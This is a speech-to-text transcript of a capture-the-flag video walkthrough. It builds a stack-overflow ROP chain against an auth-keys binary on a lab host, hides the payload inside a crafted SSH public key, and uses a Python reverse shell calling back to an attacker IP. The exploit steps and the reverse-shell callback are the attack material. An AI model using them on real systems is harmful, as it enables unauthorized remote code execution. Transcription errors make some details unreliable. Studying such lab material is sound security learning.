0x 400 274 continue let's run we can um d1 to disable the breakpoint one so if i do info b one is disabled we go to two so let's see run one two three four we hit two and let's see rsi is still at evaluating so i don't think we've printed that out yet let's see okay so yeah we have not printed that out i think i wanted to go here uh let's go break on 4299 so b star zero x four hundred two nine nine continue so let's see what our sp is right after that call it's pointing to this which is five so i'm not sure exactly what is going on here but i'm bad at static analysis so let's get away from that and the great thing about jeff is we have this pattern create so we can create of 1024 bytes let's go 300 hex to decimal to see what that space is 300 hex 300 is 768. so based upon the base64 i'm assuming that's what this is copying 300 we're gonna see if we can put something bad there so let's go pattern create 1024 that's greater than 300 and before we run this it's going to on base64 it so we just have to do echo dash n and base 64 w0 to give it base64 so i can copy this and do run one two three and paste this base64 in and we can see vaude is at rdx so i can probably do a pattern search for that and we see it's found at 768 but the stack pointer is what eventually gets over into rip so is there any string here x slash s we can we do have a string here so let's search or pattern search on this 776. so let's put uh 776 a's and then we'll put four b's and see if we get um rsp to be all b's we continue info register we don't even have registers so let's go python3 dash c print a times what was it 776 plus we'll do b times eight plus c times eight okay and we want to base 64-w to encode this run one two three paste this in and let's see what we have rsp so x s right there and we have the b's so if we put something here we could actually probably get this to execute that function so if we go here let's see um we just don't want it to sag fault right so let's go and go to start what would happen if we put it to um this function so we want to put it to 3 a nine so let's go back to our python code and then instead of these b's let's put uh backslash x and it was a903 for l so a9 o3 4o then we got um the null byte and then we gotta do four more because this is 64 bit so a90340 then one two three four that looks fine and i'm going to just copy this to my clipboard and i can run one two three and paste and it's still crashed let's see x slash xg and we're going to do rsp and it is set at the seas 776 let's get rid of these c's real quick and try this again maybe i screwed up somewhere one two three paste x slash xg rsp let's see let's go back to the pattern create and let's see echo dash n base 64-d wait that decoded i don't see a decoding error weird ah dash w0 and then to the clipboard r123 paste okay and i'm going to set a break point on this return so 436 b xg oh we can string it rsp what if i did like the wrong register last time um pattern find paste its pattern search 776 776 a90340 a903 4l that should be right so 1 2 3 paste we're at the return x slash xg rsp what it's got o4 e3 a9 c2 i don't know where the c2 is coming from we decrement this by one it should get off that c2 so r123 paste this and now we can see the return and that's going to a9 so if i continue banner number of arguments so that's working as expected i don't know why this is happening so instead of basics to following let's print this to xd and c2 is indeed there but i'm just printing a's and then this and it's adding c2 like this plus is becoming the seat what is that man ascii c2 c2 i don't even know what character that is um let's try bite encoding these and now it's not doing hex um this is one of those things where i guess python 2 is still the winner because i don't think it's going to have this issue so python 2 oh wait um my python defaults to three so specify python 2 and we have 4 401 a9 so uh yeah when generating these one-liners i guess use python 2 or check the comments and hopefully someone will find the correct way to do this but we'd run and now we can successfully um hit wrong number of arguments and that is what we want so we've performed the buffer overflow and jumped it to here so we can prove we can jump somewhere in the program so the next thing we have to do is create a rock chain to get um code execution of what we want so let's clear our workspace and probably run ropper against this binary to find some type of rock chain that we can do in order to get code execution because we know there are cis calls so if we go to space we do have like syscall that we can abuse so if we can set um all the registers we need uh we can call this and potentially get like an exact ve so before we do ropper let's do um syscall table i want to say chromium is the one i like using uh and we can also check like the bsd github to find out the calling conventions are the same uh oddly enough like this is a weird thing uh exec v e is the same and i like this thing because it tells us what like the cisco number is this is rax and then arg012 so it tells us all the registers how to do this and what belongs in them like this erg v this is rsi so rsi is pointed to um all the arguments of this now if we do let's see if i can find this quickly open bsd syscall.h is that it what is it going to say yeah this is going to define all the s calls so we go down to 59 59 is exact ve and in chromium 59 is this 58 v4 for clone but we got read link sim link revoke and then after umass c h root get fs yeah exit wait for kill and i think in syscall one in bsd is exit and at least on linux i think which chromium follows one is right so i think this is why it was kind of running but failing because the seg fault would happen on the exit and it would set it to one and try to do a right because that's what the syscall i think is on our linux headers but in bsd land that one is cis exit so that's probably why the binary was like half working because some of the sys calls line up to be the same and the other ones don't so at least um talking through that solution issue we figured it out but we know we want to set eax to be our ax to be 59 3b is 59. then the next register we want is the file name this and this so what i'm going to do to make this easy is we're going to print the screen let's go exec ve whoops i do not want to do that yet exec v e this will be actually yeah let's just copy it go to obsidian [Music] create note paste and then go up here i wish this table um had some fancy javascript or something where we can get these arguments lined up as you scroll down i think that's my biggest complaint about that but now i can go over here and line them up so all right x is going to be 3b all right uh x3b rdi is file name rsi is argv and rdx it's going to be an environment so you have to get all these variables onto the correct thing so that is when we do ropper to try to find gadgets so if we do ropper um what is it auth keys i think we do dash dash file and this prints like the gadget chain and we can do dash dash search um pop rdi was that the first one first one is rax so how do we get data into rax there's none we look at rdi there's none if we look at the next one rsi there's none we look at rdx we do have a pop rdx so um rdx is poppable but all the others are not so we have to find different gadget chains to get data in there and that's where this machine's like difficulty goes through the roof because these gadgets are not easy to find with the exception of course of this pop rdx that we're just going to record real quick we can go to obsidian and yeah these notes kind of went poorly but oh well gadgets maybe i'll clean it up maybe i won't but this is a good gadget pop rdx and we have the memory address so the next gadget we have is pretty cloaked i'm just going to view everything and if we go back to the syscalls of this uh we want to get rax so what i'm going to do is search here for ax and see if we have anything um xor or ax rex this is going to zero it out so those aren't any good but we do have this shift right and shift right is a weird argument so i'm going to log this as a potential gadget and it'll make much more sense once you see it in action there we go so we got shift right and even though it's eax eax is part of rax so it'll do and there's nothing really else there there is this not al and this is hidden if we go back to our register sheet that was here we can see al is actually part of eax which is part of rax and the not is going to take an inverse so let's log that one so if we go here and copy this okay and this is going to be our ax this simply enough will be i think rdx yeah rdx okay so where are we um yeah so we want to explain this and if we look at the assembly where we do this buffer overflow and the base64 uh we're loading it here and this is where the overflow happens actually we load it right here so we turn this into rsp and we copy more than uh we have and it's going to zero out our ax 0 at out rsi zero out rdi because it's copying a zeroed out rsi over rdi popping rdx and returning and this is where we overwrote rsp so this is the overflow right here and it's zeroed out so we know this is going to be nothing uh we can confirm this real quick if we wanted to maybe um let's go and set a breakpoint for here so 436b so 0x actually i'm just going to close gdb reload it so we kill killed previous breakpoints 400 and then 36 b and we're going to run a python code again which will crash it r123 paste this and we hit the breakpoint on this return so if we look at our registers we can see rax is zero rsi and rdi zero as well and we can also take a look again at this string let's see what this is this is 6010 c0 i know we looked at this before but i'm at a different point now so let's break at 601 0 c0 0x 601 0 c0 and this looks better actually um a is repeated 768 times so this is the start of what we on base64 um i'm not sure why we didn't get it before maybe when we did the pattern we didn't give it base64 and it was all zeros i'm not sure what happened like 10 minutes ago but now it's good maybe we just broke at a different part of the program it's always sucks doing all this been x stuff live but those are zeros so we know rax is zero and we want to set it to 59 because 59 is the chromium or not the chromium but the syscall for exact ve so we want to set it to that and this is where it's going to get a little bit hard so uh let's see the it's not really math because if you think about this as math it puts you in a weird rabbit hole it's more of just pattern recognition so we're starting at can i make this bigger uh no oh well so the start is going to be one two three four one two three four this is where we start we do a not and not is going to take the inverse so it's doing spacing weird on this um oh well one two three four one two three four one two three four one two three four yeah i don't like this um i'm gonna switch over to notepad or something so hold on a second okay so here we are in notepad plus plus and the characters are lining up so doesn't make it easier so we start at rax to be all zeros we can knot it to add ones and then a shift right if we do a shift right here nothing happens because shift right moves everything to the right one so it will take off the last bit and add a zero here so after this knot if we did a shift right it would go zero and then the rest once so with this we can build a string from left to right and get whatever value we want so the target is going to be uh 59 so 59 will be let's see this bit is 128 128 is greater than 59 so zero the next bit is 64. 64 is greater than 59 so zero next is 32 32 is less so that's on the next is 16 so 16 plus 38 is 48 the next is 8 8 plus 48 is going to be 56 56 is still less than 59 so that's on then the next is 4. 56 plus 4 is 60 60 is greater than 59 so that's off next is 2 56 plus 2 is 58 58 plus 1 is this so this is going to be um exec ve 59 i don't know why i always capitalize that but this is the syscall so we want to build this string left to right and it's going to seem unintuitive at first because you'd think you'd have to do math and kind of figure out what all these calculate to to get down to 59 but this is a game of patterns here so we're going to shift right and we're going to get this and if we knotted this this one or this zero would turn into one which would be this bit but we want to create two ones so we're going to shift right again so i'm going to do shift right and it's going to do this so now these two zeros if we do a knot it's going to turn those two zeros into ones and we have successfully built these two bits now the next bit is a zero so we're going to shift right and now it becomes this and we have now have three bits we're going to do the unintuitive thing and do it not here which is going to make it not look like it's alike but keep in mind we can invert this any time we want so it's not a big deal so i'm going to do a not 1 0 0 all these ones and now i can shift right and that's going to do this so if we did a knot here it would turn into this so if we knotted this it does this and we have these bits however if we do shift right it puts this at a zero and we don't want these bits to be different so we're not going to not we're going to do another shift right and it's going to do this and then we're going to shift right yet again because we want three once in a row so we copy this zero like that keep in mind that last bit keeps going off and now we are really close so we want to um let's see not it i believe wait yeah not so it doesn't look like we're closed because nothing really matches up but these two zeros when we do this not turn into these ones this turns into the zero and these three zeros turn into these three ones so we'd knot it and now it's looking really close to this we just have to put two more zeros on it so two shift rights so it goes like this uh there we go and then one more shift right and we have hit our target uh zero zero one one one yeah we have one right here so this is the math or the complicated math of getting exact v e all right getting uh rax equal to 59 with just these two calls of not and shift right so we can copy this and then i'm going to go back into my vm and we can get rid of the math and just put all those calls because we're going to want that in a little bit so that is that gadget chain and the next gadget chain we have we need to get what is it going back to um this we have rax so we need rdi and rdi we don't have the gadget for if we go back here i know there's probably a wrapper command in gdb to do it but if we look at this and my memory is shot rdi search for di um xoring out so that's not good moving rsi into rdi so if we have something for rsi it could be good xor xor again move rsi into rdi we have moved esi into edi we have these commands which are interesting and it's where that wrapper is highlighting those generally the commands dropper highlights have some type of weird edge use case so looking through all these nothing really sticks out as super easy so to do this one we're going to need to use quite a few assembly instructions very first off we have to use this move ss which is going to take rdx and put it into xmm1 and this is going to move a floating point number so we have to keep in mind when we do a code so this will be what is it rdi so we have this gadget and if you want to look you can look at like move ss assembly to see what it does but it's going to move a uh scaling floating point number so it just comes down to um it may make sense in just a second when we go over it so this is gonna move rdx into xmm0 which we don't want rdx we want rdi however there is this pop rdx gadget so in order to do it we can pop rdx and with rdx we pop it with what is it the pointer or float pointer to rdi so now we when we go to this thing we're moving rdx which is just a pointer to rdi into xmm0 so the next step here is to use yet another weird assembly function and that is going to be where is it this one we have xmm0 i'm going to move that into esi and then return so looking at this and you can see exactly what this function is uh convert to a double word integer so it's going to move xmm0 to esi and then after that we have our final gadget which is over here we can move rsi into rdi it's going to pop rdx which doesn't really matter we just have to know so we can align the stack and then return so let's see is there i don't want to do this x or rsi because if we use rsi that will mess this up so move rdi rsi right here so uh this instruction is i guess three bytes long so six seven this is the one we want the key piece of information like in assembly is you can break up at the op codes anywhere so even though it's saying this extra we can jump here and the crazy thing is um you can even go in middle of instruction so even though there is no uh 365 we could go into 365 and make our own function if that's valid assembly like i don't think uh this move ss is actually in the assembly if we look through ida that is a function that is built to be vulnerable and i'm seeing if i can find it real quick um i think it's part of these so let's see i think it's this weird like move statements of moving it in i think we click on move there we go undefined second do anything yes so these are all the op codes for move if i go into one and we turn that into code we now have move ss so again move is really just hex for something i don't know in either the hotkey anymore to undo it to view it but we undefine and we can see each of the like hex values for this and we just go one in and we say now that is code and we have now defined the cv2si function so again it's just how functions work in assembly so i think ffe8 is jump esp so if there was a function um instead of ffe8 which equals jump esp if it was um let's say aaffe8 which equaled i don't know something we can always say well this is going to be one byte let's say this is two bytes and this is three bytes uh we can just say skip the very first byte of a to go straight to ff and that's what we did with these two um instructions and that's what ropper does so hopefully that kind of helps illustrate drop chains and how you can create arguments out of nothing but it probably just confused people because i'm not good at explaining this stuff at least in my head i'm not so we have i think all of the chains to do what we need so we have rax we have rdi and because we have rdi and part of rdi is um the next op code which was rsi we have them all because for rdi we do get esi we just don't do this last step so we have all the instructions so we can do rsi so now it's building our exploit script so let's go back to our python and we're going to build this in python 3 and hope we don't have that weird error we did in python 2. so let's do that it will probably be easiest if we just start off with doing the eax thing so you can see how that works and then we'll go into all the memory management stuff after that so let's build a proof of concept to set um rax to 59 and i may say ariax eax i'm using them interchangeably i don't know if it's correct but oh well so we're gonna do buff is equal to nothing to initialize this and then we gotta create our um junk so a times 768 i think is what it was if i do python 2 776 i think so 776 v buff 7 6. if this is wrong then we'll just fix it and then after this is where we have a rock chain so we have to define our gadgets so we can define gadgets and for this i'm going to from pwn import star so i have pack 64 bit which is a cool command so let's go over here and for rax we need two gadgets we need this shr so this is the shift right so shr is equal to p64 that and we want zero x and then we want a not and this is going to um gadget what if i can do i guess i should not al and shift right on eax and this can be equal to p64 and we can copy this naming conventions are horrible so now we have those two we know the buffer started at um [Music] all zeros so we want to do not al right so if we go down rx yeah so not and then we want to shift right twice so buff plus equals shift right eax and we do that twice then we do the knot and then i think we shift right three times and then we do a knot and then we shift right twice and then do we do a knot again no so let's go over this really quick we start off with not shift shift not shift not so shift knot then shift shift shift not shift shift okay this hopefully is equal to 59 as long as we did it correctly which you almost never do the first time so i'm not going to be too upset if i did not so what happens if we print buff now python3 buff.pi it looks good so we can encode this in base64 so b64 string is equal to b64 in code and then buff and then i'm going to not decode it so it's not a byte string and we want to do from base64 import b64 decode and then i'm also going to import something i haven't used before in videos is piperclip and this is just going to allow us to copy stuff straight to a clipboard so we can print b64 string and we can also pyperclip dot copy and we'll say b 60 well i can just do b64 string like that right i think so so python 3 buff b64 encode i'm not sure if i said encode or decode but i type decode so now we have this so let's see what happens when we run this so run one two three paste i don't know why i copied it um because piperclip is putting it in my clipboard so we can run this and let's see s i so the first thing it's doing is that not a l oh and then it does like adc cl because they're not clean commands so step by and it hits this return and we look at uh what was this rax rex is now um ff and we shift right return uh let's see rax will that print print rax 7f shift return not return shift so we're slowly building our ax it's now at 27. i wonder what happens when it fails i'm just going to continue and we're probably going to crash but rex hopefully is 3b and 3b i think is 59. um let's see hex 3b to decimal 3b 59. so we have now successfully um set rax so now the left over is to set the other parameters so let's go back in here and we have to create gadgets so here we can say setting rax and then the next one we want to set is going to be let's go back here we set that so we want to set rdi so let's go to our gadgets how we did this um we need pop rdx so in our gadgets whoops we're going to put pop rdx like that and then the next gadget we wanted was this move ss so i'm going to copy this move ss xmm is equal to p64 this then we want the weird um this is rdx2 with the weird this and this puts it in esi i don't have a good way to do this naming um i'm sure i'll either webs and be like oh man they name these gadgets so well and then finally we want um rsi to rdi so we can say move rdi rsi and i'm also going to put pop rdx because we'll reuse that in a second so copy this put it here and the reason why i said i'll use this pop rdx in a second because the gadget chain to set esi begins with pop rdx so we don't have to make this gadget again for the next argument because we're already popping it from the previous one so it's important to note that is a pop rdx as well so we can add our gadget chain so we can say setting i always forget what argument is and i probably said it wrong a few times already but this is going to be rdi so setting rdi and the very first piece of that was doing a pop rdx which lets us put anything we want into this rdx value or a register and in order to do this next part we have to start writing data so we don't have anything to put into rdx this is where something that oxdf had created for his blog post is going to come in handy again like i said we spent a long time yesterday or the day before recording this video going over this so both my video and his blog post are top notch um it was like a four hour slack call and then the day before was also multiple hours and again always helps talking with someone through these problems so ignore the ssh headers piece right now so all the data we're dealing with the setting rdx this is the wrap piece so before that this is the filler that's 776 bytes of stuff we can do and the base address here at the very start we know that that base address is leaked um if we go to base 64. uh that is this guy this base64 value which is 601 0 c0 so we can say base address is equal to 0x 601 0c0 i hope that's what i said so that memory address 601 let's see 601 0 c0 601 zero zero yep so we know the start of this is going to be here and then we can just place a bunch of things on the stack and then our romp will start using that so we got to put strings and we put three different strings because of how we call the syscall so if we go here and look at rsi for 59 i should go back to obsidian but it wants a array of arguments and the arguments we want to do are going to be python which is the binary we want to execute dash c which is the first argument and then our python code which is going to be the um what is it like that web crater we had built before so we can't just use these plain strings as drops we need memory pointers so because we know this is always going to be 601 0 c0 we can calculate what address or what space all these are and then we can write those pointers to the stack as well so when we want to pull things from here we can just say okay go to this address which is going to point to this space that we wrote so it's a really cool way of doing that and then these as floats are going to be used for that move ss command because it wants floating point values and we just fill it with a bunch of blank space to get to where override is so hopefully this kind of makes sense and it'll make more sense as we go along and i forgot to put a 0x right there so let's see the first thing we have to do is create our um array right here so let's create the array or list of exec ve args and the very first one is going to be just user local bin python 2 and everything ends with a null byte so the next one is going to be the c and then the final one and my computer hung there we go that was weird hopefully like i'm not running out of disk space or something is going to be a python shell and we're going to pull this shell from our client if we let's see go to a new pane let's cat vim.text and we can probably just run this so i guess we can do it like this copy and our python shell is going to be that okay so exec ve ergs are done and wait we just need a null byte there we go everything ends in all bite so exec v e ergs so now we have this and if we just wrote this to the buffer it would be hard to get all the pointers to everything so i'm going to do a separate loop and we're going to have this loop as addresses of exec ve args and that's just going to be a blank list for now because we're going to populate it so for argument in exec v e args so for every item in this list we're going to write the starting point so addresses of exec v e args plus equals the length of the current buffer plus base address and we should have buffer defined before this there we go so right now it's going to be zero plus the base address is for the first one and we can say buff plus equals argument so the second one is going to go and now the buffer is actually going to have data in it so it's going to go to a different spot so now this allows us to have the address of where every like string is stored so we just covered these three actually four because we have the null byte there as well we don't but we can just put buff plus equals or we can shell and think of where to add the null byte doesn't really matter i think that's good so now we have a terminating to this whole array so the next piece we have to do is going to be get this as a floating point so uh buff plus equals the normal bike is there okay so this is um build one liner i guess and this next piece is going to be get floating point addresses okay so now we need to get floating point addresses of two things i believe uh we need it for this python2 and then we need the um start of this um actually shoot i skipped a piece so this is build one liners and this should be build ergv and we only put this stuff on stack if we look buffer plus equals erg we're not actually putting the addresses so we only put these three things on stack we need to before we go into floating points we need to build the pointers so um build pointers or drop a drop is bad um right pointers should be good so we can say for address in addresses of exec ve args and we can then do buff plus equals and we want to put this as a memory address like that and then this isn't a null byte like this this is p64 of nothing which is null there we go so we have build argv which is going to go and build these three strings and drop them to the buffer and then we have right pointers which is going to write these three pointers and drop it to the buffer as well as the null so the next piece is the flirting point address and we want to locate where we are in memory before we touch anything so we're going to create the argument rdi pointer because this very first one is going to be used for rdi which is the address of python as float so this one is what we'll use in the pop command eventually and it's just going to be pointed to this python2 variable the next pointer is going to be for rsi and rsi is going to be pointed to the ergs array and it's smart enough to know to build this array like in memory and just terminate when there's a null byte so it's going to be able to first go here which is a pointer to this string then the next one it pulls then the third one it pulls so this is going to be the ergv array so rdi pointer is equal to lan buff plus base address so that calculates where we are so we can drop the uh later when we pop it we can use it and we write the data of it so buff plus equals struct.pack and we need to import struct actually so import struct and you'd think parent tools would have an ability to do this but i don't think it does so struck.pack and then this will convert to floating point and we just do exec ve ergs and we want this to be the addresses of the exec ve ergs and the very first one and we can i'll adjust it to be eight bytes if we want i don't think we have to um yeah we shouldn't have to do anything so this should be good so we grab the location of where we are before we write this address so when we write it this rdi pointer points to this memory address so the next thing is our side pointer and you guessed it we do the same thing record where we are in memory and this one is going to be uh what is the location we want we probably should have recorded where we were in memory just before this because we need to get the memory location of right here so we can say um address of our v maybe i don't know is equal to the length of the buffer plus base address so this one can be um address arc v so the main issue we're probably going to run into is encoding we probably have some things that are just not getting written well on stack but now we have these two addresses so we have to do our filler to get to where we set our ax so here's all the gadgets i'm going to move the gadgets up to near the top base address gadgets probably be best to do these in multiple python files but we're no longer writing 776 a's we're going to write um 776 minus the length of buff so if buff was 300 we're now gonna write 476 a's to get us right back here so um let's see let's see if it works there's no way this works we're gonna sag fault right off the bat um the one thing i probably should do is change the nip address but let's just see if we sag fault python3 buff.pi uh we don't even have valid code uh 34 what is this for address and i don't even know what i was typing there i was talking and doing something and uh not work out well oh p64 question mark question my question mark uh we have to finish writing the rock chain so this is going to be a pointer to rdi that is this guy and then the next thing we want to do buff plus equals the um what is it i think move ss move ss xmm then we want to do the next gadget which will be well i'll copy these two so buff plus equals this and then this so we set rdi and i guess we can run this and see if it crashes before we do anything else so python 3 line 29 and and bytes wonder if i do base address not as p64 let's see address argv not defined that's there oh i have s there we go pointer rdi not defined rdi underscore pointer okay we have copied it so if we run one two three and paste we hit a break point we're setting eax right now and we hit it again oh we're doing the um rdi stuff now so if we look at registers rdi is equal to null right now but if we step in we do this return now this is setting esi return moving rsi into rdi and here we should be able to see what rdi is rsi rdi and it looks like we're correct this almost never happens uh look at that and we have the string we're still going to sag fault because we don't have the rest of the program done but this is really good progress and let's reset that breakpoint so let's go into the buffer so we have set rdi and the next piece we want to do is set rsi and rsi is going to be the arguments and we don't have to do a pop rdx because we're doing pop rdx at the end of rdi so all we have to do is write the memory address of our rsi pointer so rsi underscore ptr and then we do the move ss and this which puts it in esi which is rsi we don't have to do this final one because that was just moving from esi to rdi so that is done and then the final thing is we want to put a null byte in the last argument for rdi and well this is just a simple pop call so buff plus equals pop rdx i think we have that gadget right here we do so pop rdx and we want to pop it with zero so p64 zero so that's going to null out rdi we could also probably find a xor rdi thing to like gadget but we can just pop it with nothing and the very final piece uh we never wrote that gadget is syscall so let's go back into ropper and we just want uh cisco it doesn't matter which one returned because uh this is called the cisco rat they're the same spot because the next argument is return so we just want to get syscall so if i go back into buff we can say gadget syscall is equal to p64 0x that and then syscall buff plus equals syscall right yep there we go so that should all work um her web cradle right now isn't going to work because this is hard coded for 10 10 14 2 which our box can't get to so what i'm going to do less we can actually go into c2 vclient and we can change this to be our ip address which ip of easiers 1 230. and the other piece is it's python um three actually we can test this i think we can just run it on the server sh-i freshness freshness at attended.htb you let me in sweet we called it test okay one two three and let's see if this works before we go and edit it because my gdb or my bsd has python 3 this is python 2 and i hate changing a bunch of things if i don't have to so python 3 buff.pi that's in my clipboard now um do we have a c2 running we don't so what i'm going to do is run it here so cdc2 dot slash c2 and sudo python3 main.pi paste this stuck out evaluating keys do who am i we get freshness so we have successfully got code execution and we can see here when i exited we have the python error message so this is looking really good now the downside is um on the attended gateway we can't just execute this because we don't have any way to execute binaries if we go back into auth keys we can look at note.text and it's enabling auth keys for sshd and that's not done on attended but if we less etsy ssh shd config and search this for let's see auth key we can see the authorized key command is using auth keys and then the four variables so this is actually going to be the public key so we just have to make this um ssh thing into the public key and this is where it's going to get a little bit confusing because i don't fully understand ssh but um this auth key again is ran when people try to log in via private key authentication however you don't need to build a private key you can it's just going to be more work because you build a private key then replace the piece of the key with the exploit you can just use public key so how ssh works when you attempt to ssh into a server you don't ever send the private key to the server which you send them first is the public key to your private key and you send it to the server and you can send multiple public keys and the server be like um that public key works uh prove to me that you own that public key so you sign something with the private key send it back to the server and the server goes okay that's good but you don't ever have to send the private key to trigger this we can just use the public key so we got to convert or buff.pi into a public key that there's no way that made sense but i don't know of a good way to explain that it makes sense in my head so we're going to start off with building the public key header so before we do this let's look at the rfc and i have my notes handy which is rfc 42 53 and let's see once this loads we can just search for ssh-rsa and this is the format it begins in it does string sh rsa and then m print i don't know what this is exactly um i think it's precision print or something for e and n and if you look at m pins format it's going to pretty much treat it like a serialized object in my head so it's always got 4 bytes of length potential and it's got 8 here and that's going to be because this is eight bytes in length so maybe it's in length i've been too long so same one we do m print on 80. it's gonna print two because two in length again one two three four negative edcc and then dead beef d-e-a-d beef and that's five characters or five bytes so that's going to be the format of this and shrsa is also done the same way so in order to write our key we're going to say buff plus equals p32 7 and we want ndn is equal to big because that's how the format is and seven is because we want to put sh dash rsa and this is seven characters one two three four five six seven so we have successfully done the first like m print or whatever it is the next one we wanna do is um the e exponent which is almost always going to be um like 65 535 i think is the default for ssh if you go back like a long time ago and like when we crack rsa uh yeah and if you don't know uh you can just go to um an ssh key and look so we're doing one or one zero zero zero one if we look at an ssh key so let's just grab freshness.pub and if you ever wondered why like all ssh keys begin with this aab because there's an all bytes i found that out doing this video uh echo dash n base64-d xxd last capital s so here we have the beginning seven bytes and then ssh rsa and then oh a is here so that's ssh rsa then we have three bytes and it's going to be one zero zero zero one so that's e and then we have one eight one so this is a length of n which is the public key and then it's going to do zero zero b9 which i don't understand what this piece is but this is where the public key begins but we have to add this if we don't have this bit here it will fail so yeah let's see where was i am i editing here where's my script did i close out i did close out okay so that's why we have that and this is going to be e and then we want to add the length of n so p32 i'm just going to call it 800 because well it's probably like 500 or something i don't know if this value matters too much uh it's probably 500 because we um get to the overwrite around oh no it would be 0x 500 i think because we get to the overwrite around 300 hex so yeah this is just adding it for a rock chain after that is equal to big and this is length of n and then buff plus equals we just hand jam the values anyways b8 in that example we'll see if this is a valid public key so let's see if this works i think everything should go so python3 buff.pi it prints and it looks like our key does begin with this aaa and if we cat this base64-d xxd last capital s or not cat echo dash n there we go we begin with ssh rsa then we do that and when our key begins we're putting junk so this looks i guess good and all these a's gets us to where we do the rock chain so let's see if this becomes a public key so i'm going to copy the hex value which is probably in my clipboard because of pi clippy but oh well i'll call this exploit.pub and we just say sh rsa and paste this in and it's kind of funny because we tell that it's an ssh rsa key but right here in this base64 it also says ssh rsa uh i just find it funny it's defined twice so let's just see if it is if we sh-i with the public key it still uses it so freshness at 10 10 10. i'll just do it dns 10.htb and it's not going to less in but we do get invalid format so our format is not good um the other thing i want to try doing real quick is increase this value to c8 v and this was just like copying public keys of ssh and looking at that value so let's do freshness of b exploit.pub format there we go paste this oh i was like i should have printed that out let's see if this works still getting invalid format why is this invalid i'm guessing the length of n is wrong and that's why so let's see v buff dot pi it's actually going to make me calculate this this is annoying um let's see let's go to the very end print len of buff python 3 buff.pi 960. let's try putting 960 here so we should have this copied to the clipboard but i'm going to do it for good measure fee exploit.pub sh rsa paste and run invalid format so we screwed up our header somehow i wonder if dash v gives us anything let's see it's trying a few let's call this exploit at parrot do we have exploit and valid format so you can see when i try to ssh it is sending a bunch of public keys that i have just tied to me and we can verify public keys won't give you that like error message if we ch mod 600 freshness freshness.pub sh-i freshness dot pub and freshness at attended.htb wait why gang i didn't think i got invalid format before i know when doing this like yesterday i was able to specify a public key with ssh i wonder if that's a bsd ism um let's just copy the key to attended so ss scp-i freshness exploit.pub 2 uh what is it attended.htb dev shm and we have to specify the user uh permission denied let's just copy it to freshness's home sh-i freshness attended dot hdb specify the user and see if this works so exploit.pub is there chmod 600 exploit.pub i think it was already ssh up there that's funny let's kill the web server we can do it here python3 main.pi sudo sudo python3 main.pi okay sh-i oh the next piece of information that we haven't talked about is antenna gateway if you look at the host file you see it here and if you do a netcat zv on attended gateway on 22 it's not there if you write like a brute force script or something you can find port 222 is open via tcp but we can sh-i exploit.pub uh root at attended gw and we specify port two two two two i'm not sure if it's a capital p a lowercase p invalid format okay so we got to fix up our ssh key we're doing this pane exit so let's go into buff.pi and i really think the issue is around these two lines um the length of the n which is the key and then whatever this second two bytes is and i couldn't figure out exactly what this is so let's just do the lazy approach and generate a large ssh key and copy the values so dash f and we're going to call this um big key dash b 16 through 84. so this should generate a giant rsa key and it's going to take a little while to generate so i'm going to pause the video for it to generate this and we'll resume and then steal all the values it's now finally asking for the passphrase it took a few minutes to actually generate this key but now we have big key dot pub so if i cat big key dot pub it is a big private key if we got my exploit.pub it is much smaller so we're probably going to want to make her exploit padded a little bit so let's base64-d xxd blast s and we can see the values so it is 801 there and it's doing easy so let's change to 801 and ec so let's go to buff.pi uh we're doing it in this pane so 0x801 ec and this probably won't work right off the bat because we'll have to do some l adjusting to get it to the correct size so let's do this v exploit dot pub paste it in and sh-i exploit dot pub freshness at attended.htb do we have that still in valid format so let's go and i'll adjust our base64. so this buff let's do buff is equal to buff dot l adjust and we want to say um 0x 0x801 i think it was and it's not in quotes and we put it with null bytes there we go so all this did is make our buffer 801 in hex length so now if i python 3 buff.pi it is definitely bigger it's filled with a's because those are all null bytes but if we go back to exploit.pub and put this key in what happens shoot sh invalid format so we are still wrong uh let's see off.pi is it 817 do we have to like remove the bytes for the header let's try that the exploit.pub you can see how finicky this piece is invalid format i wish i could figure out exactly why this is we can go back to this pane cat exploit.pub and we can i wonder if we have to end with a line break like that no that can't be it ssh invalid format okay so that's not it cat exploit.pub let's echo dash n base64-d xxd last dash capital s and we can do it with big key as well and that is in here so cat big key dot pub echo dash n paste base 64-d xxd less like this okay so zero e c right here and then this is where the key begins so it's still 801 here ec let's see zero zero zero seven seven three seven three six eight d two seven two seven three six one zero all nulls zero three zero one this is one null 0801 so unless this piece is also part of the header we have everything correct let's look at the total length and my key is like like 14 bytes shorter um python say what key am i doing uh let's just redo this so python 3 buff.pi and this is definitely my key and we are counting exploit.pub and that doesn't end in equals so i think we edited the buffed up pi and didn't recopy it into the key oh man it's like midnight it's 11 45 p.m by me i think my time zone is wrong on my computer but yeah it's late make mistakes intended.hdb there's to be invalid format again i don't know what's going to go on actually no it worked so we don't have any error message so we've successfully created that public key so we can go to whatever pane are ssh n here we are v exploit.pub and we're going to put a new key and we can sh-i exploit.pub22 root and it did not ask for or did not say invalid format if i do who am i it still did not work who am i i did not expect this to happen let's see sudo grep dash i iptables vero log messages so 358.47 is the last one like an hour ago so it definitely did not attempt to connect back which is not great uh let's see one of it doesn't have like one of the libraries in that wrap shell so we can change the shell out with a more simple one so let's go into buff.pi and where our python code is this shell let's change this so we tested this did work i don't know why this would not work certainly but we can reverse shell cheat sheet pen test monkey if one rev shell doesn't work always try the next uh python so we can do this and shell is equal to b paste this and we want to replace ip address with 10 10 14 2. 10 10 14 2 and we'll say port 80. okay so now we have a reverse shell on port 80. pseudo nc lvmp 80. python 3 buff.pi copy that to my clipboard exploit.pub paste and we can attempt to shn nothing i'm going to try on 443 is this a firewall rule i'll be so upset if it is let's see search for 80. four four three v exploit.pub paste 443 uh nsa session died i wanted the servers reverting that would really suck uh sh-eye freshness freshness at 10 uh attended hdb thing 10 10 14 1 my vpn died okay we're back up and the exploit is not working so what i'm going to do is we're going to edit this and we're going to try this ssh key maybe like adding this ssh header screwed up alignment somewhere so i'm going to see if we can fix that quickly ifconfig and we want to set to this ip come on there we go set here 443 is fine so python 3 buff.pi we want to grab this and let's see sh-i what was the key we used to go into rvm oh vm root at 192.168. let's see dash ivm sweet okay so off keys one two three paste this and we get a sag fall so it looks like when we added the header we screwed something up i wish i checked for that like a while ago so egdb auth keys we probably should do dot slash auth keys i don't know if it matters r123 paste let's see where do we error uh do we have export i was hoping i could get that um error message out forget what it was oh well gdb off keys let's go to ida let's break on our base64 where we return this is 436b b stir 0x 436 b run we broke on the return so let's now see if we make it all the way to our syscall so our syscall let's go into buff.pi oh i think we're sag faulting because we're using python 2. i didn't edit this to be python 3. python three see so now we're on syscall and we can look at our stack rax is 3b that's 59 that's what we wanted rsi is pointed to these three arguments and rdi is pointed to this so i think this is 